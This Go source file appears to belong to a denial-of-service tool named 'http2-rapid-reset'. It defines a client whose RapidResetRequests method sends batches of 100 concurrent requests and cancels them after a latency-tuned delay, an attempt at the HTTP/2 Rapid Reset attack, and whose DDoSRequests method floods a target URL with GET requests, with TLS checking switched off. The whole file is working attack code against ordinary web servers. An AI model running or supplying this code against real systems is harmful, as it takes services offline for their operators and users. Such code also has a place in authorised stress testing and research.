// Common client implementations
package sender

import (
	"context"
	"crypto/tls"
	"http2-rapid-reset/pkg/terminal"
	"net/http"
	"sync"
	"time"
)

// assume the max requests per stream is 100
// so we send 100 simultaneous requests and reset
const REQUESTS_PER_STREAM int = 100

// When the loopcounter loops (rolls over from `size` to 0),
// `true` is passed, otherwise, false is passed.
type LoopCounter struct {
	size uint
	Curr uint
}

func NewLoopCounter(size uint) LoopCounter {
	return LoopCounter{
		size: size,
		Curr: 0,
	}
}

// Advances the counter by 1.
// Loops back to zero when the counter reaches maximum
func (loop *LoopCounter) Next() {
	if loop.Curr == loop.size {
		loop.Curr = 0
	} else {
		loop.Curr += 1
	}
}

type Client struct {
	inner *http.Client

	tpt *http.Transport
	// the target address to perform requests to
	targetAddress string
}

// Create a new client instance with a target url
func NewClient(targetAddr string) *Client {

	transport := http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}

	var c http.Client = http.Client{Transport: &transport}

	return &Client{
		inner:         &c,
		tpt:           &transport,
		targetAddress: targetAddr,
	}
}

// Perform the rapid reset request specifying:
//
// - frequency: number of rapid-reset requests per second
//
// - duration: length of attack
func (client *Client) RapidResetRequests(
	frequency uint,
	duration time.Duration,
) error {

	var ev, ch = terminal.NewEvent("Rapid Resets")
	go ev.Start()
	defer terminal.StopEvent(ch)

	var loopCounter = NewLoopCounter(5)

	var startTime time.Time = time.Now()

	// ticks every period: 1 / frequency
	numNanoSeconds := 1_000_000_000 / frequency
	var ticker time.Ticker = *time.NewTicker(time.Duration(numNanoSeconds))
	var resetDelay time.Duration = time.Duration(time.Millisecond)

	for time.Since(startTime) < duration {

		go func() {
			var wg sync.WaitGroup

			// fmt.Printf("Started: %v Now: %v\n", startTime, time.Now())

			req, err := http.NewRequest("GET", client.targetAddress, nil)
			if err != nil {
				return
			}

			streamCtx, streamCancel := context.WithCancel(context.Background())
			req = req.WithContext(streamCtx)

			// send out requests in batches
			for i := 0; i < REQUESTS_PER_STREAM; i++ {
				wg.Add(1)

				go client.request(req, streamCtx, &wg)
			}

			// upd8
			ch <- uint(REQUESTS_PER_STREAM)

			// perform the stream reset after a short interval
			// gives the server some time to perform some computation
			time.Sleep(resetDelay)
			streamCancel()

		}()

		// wait for `REQUESTS_PER_STREAM` periods
		for i := 0; i < REQUESTS_PER_STREAM; i++ {
			<-ticker.C
		}

		// measure the latency here
		// set the new delay to half of the measured latency
		loopCounter.Next()
		if loopCounter.Curr == 0 {
			go client.updateRequestLatency(&resetDelay)
		}
	}

	return nil
}

// Perform traditional DDoS attack specifying:
//
// - frequency: number of rapid-reset requests per second
//
// - duration: length of attack
func (client *Client) DDoSRequests(
	frequency uint,
	duration time.Duration,
) error {
	var ev, ch = terminal.NewEvent("DDoS attack")
	go ev.Start()
	defer terminal.StopEvent(ch)

	// var loopCounter = NewLoopCounter(5)

	var startTime time.Time = time.Now()

	// ticks every period: 1 / frequency
	// numNanoSeconds := 1_000_000_000 / frequency
	// var ticker time.Ticker = *time.NewTicker(time.Duration(numNanoSeconds))
	// var resetDelay time.Duration = time.Duration(time.Millisecond)

	req, err := http.NewRequest("GET", client.targetAddress, nil)
	if err != nil {
		return err
	}

	for time.Since(startTime) < duration {

		go func() {
			res, err := http.DefaultClient.Do(req)
			if err != nil {
				return
			}
			code := res.StatusCode

			_ = code

			// upd8

		}()

		ch <- uint(1)
		// // measure the latency here
		// // set the new delay to half of the measured latency
		// loopCounter.Next()
		// if loopCounter.Curr == 0 {
		// 	go client.updateRequestLatency(&resetDelay)
		// }
	}

	return nil
}

// Perform a simple request
func (client *Client) request(
	req *http.Request,
	ctx context.Context,
	wg *sync.WaitGroup,
) error {
	defer wg.Done()

	_, err := client.inner.Do(req)

	select {
	case <-ctx.Done():
		return nil
	default:
		return err
	}

	// return err
}

// Send a single request and update the latency
func (client *Client) updateRequestLatency(delay *time.Duration) error {

	start := time.Now()

	req, err := http.NewRequest("GET", client.targetAddress, nil)
	if err != nil {
		return err
	}

	client.inner.Do(req)

	end := time.Now()

	// set to half of measured latency
	*delay = time.Duration(end.Sub(start)) / 2

	return nil
}
